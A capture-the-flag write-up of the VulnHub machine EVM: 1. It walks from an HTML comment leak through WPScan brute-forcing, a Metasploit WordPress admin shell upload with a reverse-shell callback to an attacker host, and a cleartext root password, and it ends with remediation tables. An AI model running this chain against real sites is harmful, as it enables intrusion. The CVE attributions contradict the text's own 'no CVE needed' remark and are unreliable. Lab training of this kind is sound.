# EVM: 1 — WordPress, Metasploit, and a Root Password in a Text File

Look at guys!! EVM: 1 is the kind of machine that shows you exactly what a real WordPress compromise looks like end-to-end. An HTML comment leaks the WordPress path, WPScan finds a vulnerable plugin, the admin password falls to rockyou.txt in seconds, Metasploit delivers a Meterpreter session, and then... the root password is just sitting in a text file in someone's home directory. Dude. It doesn't get more "real-world bad practice" than this, fr fr.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | EVM: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/evm-1,391/ |
| **Techniques** | Nmap port scan, HTML source comment analysis, WordPress enumeration with WPScan, admin password brute-force, Metasploit wp\_admin\_shell\_upload, credential discovery in filesystem |
| **CVEs** | CVE-2020-24186 (WordPress plugin shell upload via wp\_admin), CWE-312 (Cleartext Storage of Sensitive Information) |
| **APT Groups** | Opportunistic threat actors and crypto-mining groups have leveraged CVE-2018-7600 and authenticated WordPress shell upload in mass-exploitation campaigns; APT41 uses WordPress sites as initial access staging |

---

## Attack Summary

```
nmap → SSH/22, DNS/53, HTTP/80, POP3/110, IMAP/143, SMB/139+445
  → HTTP: Apache default page → HTML comment: /wordpress/
  → WPScan: plugin c0rrupt3d_brain, user c0rrupt3d_brain
  → WPScan brute-force rockyou.txt → password: 24992499
  → Metasploit wp_admin_shell_upload → Meterpreter (www-data)
  → shell → /home/root3r/.root_password_ssh.txt → willy26
  → su root → uid=0(root)
  → /root/proof.txt
```

---

## Methodology

1. Full port scan to enumerate all services
2. HTTP source review to discover hidden WordPress installation path
3. WPScan to enumerate plugins, themes, and users
4. Admin password brute-force against WordPress login
5. Metasploit authenticated shell upload for RCE
6. Post-exploitation filesystem enumeration to find cleartext root password
7. su root with recovered password

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.103

nmap -A -p- 192.168.1.103
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.x
53/tcp  open  domain      (DNS)
80/tcp  open  http        Apache httpd 2.4.x
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
```

Seven services. HTTP on 80 is the primary attack surface. Start there.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration: HTML Comment Disclosure

Browse to `http://192.168.1.103`. The default Apache page loads but there's more than meets the eye:

```bash
curl -s http://192.168.1.103/ | grep -i "wordpress\|wp-\|comment"
```

The HTML source contains a comment revealing the WordPress installation path:

```html
<!-- wordpress @ /wordpress/ -->
```

Confirm with directory brute-force:

```bash
dirb http://192.168.1.103/
# or
gobuster dir -u http://192.168.1.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Navigate to `http://192.168.1.103/wordpress/`.

**Real-world note:** Developers leave TODO comments, debug notes, and path references in production code constantly. OWASP A05:2021 (Security Misconfiguration) covers exactly this: developer artifacts left in deployed code. Automated DAST scanning catches these before attackers do.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 3 — WordPress Enumeration with WPScan

```bash
wpscan --url http://192.168.1.103/wordpress/ \
  -e at \
  -e ap \
  -e u \
  --api-token YOUR_WPSCAN_TOKEN
```

Key findings:
- Vulnerable plugin: `c0rrupt3d_brain`
- WordPress user: `c0rrupt3d_brain`
- WordPress version: (current at time of VM creation)

**Alternative enumeration without WPScan:**

```bash
# Enumerate users via wp-json API
curl http://192.168.1.103/wordpress/wp-json/wp/v2/users

# Check plugin directory listing
curl http://192.168.1.103/wordpress/wp-content/plugins/
```

**MITRE ATT&CK:** T1596 — Search Open Technical Databases; T1592 — Gather Victim Host Information

---

## Step 4 — WordPress Admin Password Brute-Force

```bash
wpscan --url http://192.168.1.103/wordpress \
  -U c0rrupt3d_brain \
  -P /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc
```

**Recovered password:** `24992499`

The password was in rockyou.txt, meaning it was in a major breach dump. Any attacker with rockyou.txt and WPScan will crack this in under a minute.

**Alternative approach:** Use Hydra directly against wp-login.php:

```bash
hydra -l c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt \
  192.168.1.103 http-post-form \
  "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:ERROR"
```

**MITRE ATT&CK:** T1110.003 — Brute Force: Password Spraying; T1078 — Valid Accounts

---

## Step 5 — Exploitation: Metasploit wp\_admin\_shell\_upload

```bash
msfconsole -q
msf> use exploit/unix/webapp/wp_admin_shell_upload
msf> set RHOSTS 192.168.1.103
msf> set TARGETURI /wordpress
msf> set USERNAME c0rrupt3d_brain
msf> set PASSWORD 24992499
msf> set LHOST <attacker_ip>
msf> run
```

Meterpreter session opens as `www-data`.

**What happened:** The module logs into WordPress admin, uploads a malicious PHP plugin containing a reverse shell payload, activates it, and triggers the shell callback. Standard authenticated WordPress RCE path, no CVE needed beyond admin access.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — Post-Exploitation: Credential Discovery

From the Meterpreter session:

```bash
# Drop to system shell
shell

# Stabilize
python -c 'import pty; pty.spawn("/bin/bash")'

# Enumerate home directories
ls /home/
# root3r

ls -la /home/root3r/
# .root_password_ssh.txt

cat /home/root3r/.root_password_ssh.txt
# willy26
```

A plaintext root password. In a home directory. Accessible by www-data. This is CWE-312 in its purest form.

**Real-world note:** Developers and sysadmins regularly store passwords in text files "temporarily" and then forget about them. This pattern appears in real breaches constantly. Threat actors run automated post-exploitation scripts that search all home directories for files matching `*pass*`, `*cred*`, `*secret*`, `*key*` immediately after gaining a shell.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1083 — File and Directory Discovery

---

## Step 7 — Privilege Escalation to Root

```bash
# Spawn a proper TTY first
python -c 'import pty; pty.spawn("/bin/bash")'

# Switch to root
su root
Password: willy26

# Verify
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/proof.txt
```

Root obtained. Nailed it.

**MITRE ATT&CK:** T1078 — Valid Accounts; T1548 — Abuse Elevation Control Mechanism

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Credential | c0rrupt3d\_brain:24992499 | WPScan brute-force | WordPress admin login |
| Credential | root:willy26 | /home/root3r/.root\_password\_ssh.txt | su root |
| Meterpreter | www-data shell | wp\_admin\_shell\_upload | Post-exploitation access |
| Root flag | proof.txt | /root/proof.txt | Captured |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | WordPress path leaked in HTML comment | Production code regularly ships with debug comments exposing internal paths; automated DAST catches these | Remove all developer comments before deployment; use DAST scanning in CI/CD |
| 2 | Vulnerable WordPress plugin with known RCE | WordPress plugin vulnerabilities are the #1 cause of WordPress compromises; plugins go unmaintained and unpatched | Audit all installed plugins; remove unused ones; subscribe to WPScan vulnerability alerts |
| 3 | Admin password in rockyou.txt | Millions of users have passwords in rockyou.txt; any password in a major breach dump is effectively public | Enforce strong, unique passwords; implement MFA for all admin interfaces |
| 4 | Authenticated WordPress file upload leading to RCE | Any authenticated WordPress admin can install plugins, making admin credential compromise equivalent to RCE | Disable plugin installation in production wp-config.php: `define('DISALLOW_FILE_MODS', true)` |
| 5 | Root password in plaintext file in home directory | Developers leave credentials in files "temporarily" constantly; automated post-exploitation scripts search for these immediately | Never store credentials in filesystem files; use a secrets manager (Vault, AWS Secrets Manager, etc.) |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Brute Force: Password Spraying | T1110.003 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | System Information Discovery | T1082 |
| Privilege Escalation | Privilege Escalation | Valid Accounts | T1078 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove HTML comments from production code** — no paths, credentials, or debug info in deployed HTML
2. **Update or remove vulnerable WordPress plugins** — audit all installed plugins; subscribe to WPScan vulnerability feed
3. **Enforce strong passwords with MFA** — admin password must not appear in any breach dump; add MFA to WordPress admin
4. **Disable file modifications in WordPress** — add `define('DISALLOW_FILE_MODS', true)` to wp-config.php to prevent plugin uploads
5. **Never store credentials in filesystem files** — use a secrets manager; enforce no-plaintext-credentials policy

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory WordPress installations; track plugin versions |
| Protect | Access Control | MFA on WordPress admin; restrict admin to specific IPs |
| Protect | Data Security | Remove all plaintext credential files; encrypt sensitive data at rest |
| Detect | Anomalies and Events | Alert on new plugin installations; monitor /home directories for credential files |
| Respond | Response Planning | Rotate all credentials; remove malicious plugins; rebuild WordPress if compromised |
| Recover | Recovery Planning | Restore from clean backup; apply all patches before bringing back online |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict WordPress admin to authorized IPs |
| AC-6 | Least Privilege | Disable plugin management in production WordPress |
| IA-2(1) | Multi-Factor Authentication | MFA for all WordPress admin accounts |
| IA-5 | Authenticator Management | Strong, unique passwords; no passwords from breach dumps |
| CM-7 | Least Functionality | Remove unused plugins, themes, and users |
| SC-28 | Protection of Information at Rest | No plaintext credentials in filesystem |

### CISA KEV

Authenticated WordPress file upload vulnerabilities and weak credential patterns appear in multiple CISA Alerts (AA21-008A, AA22-074A). CISA advises organizations to apply patches immediately and audit all WordPress installations.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (DISALLOW\_FILE\_MODS; MFA on admin)
- **D3-OAM** — Operating System Administrative Management (no plaintext credential files)
- **D3-HBPI** — Harden Build Pipeline Integrity (DAST scanning; remove debug comments)

---

## Final Thoughts

EVM: 1 is a perfect beginner machine because every step is a real-world finding you'll see in production environments. WordPress with default Apache, a leaked path in an HTML comment, a plugin with a known RCE, a password in rockyou.txt, and then a root password sitting in a text file. Each vulnerability exists in real companies right now. The chain from HTTP to root here is the exact same chain threat actors follow in mass WordPress compromise campaigns. gg, no cap, legitimate training value.

Thanks guys!! (❍ᴥ❍ʋ)
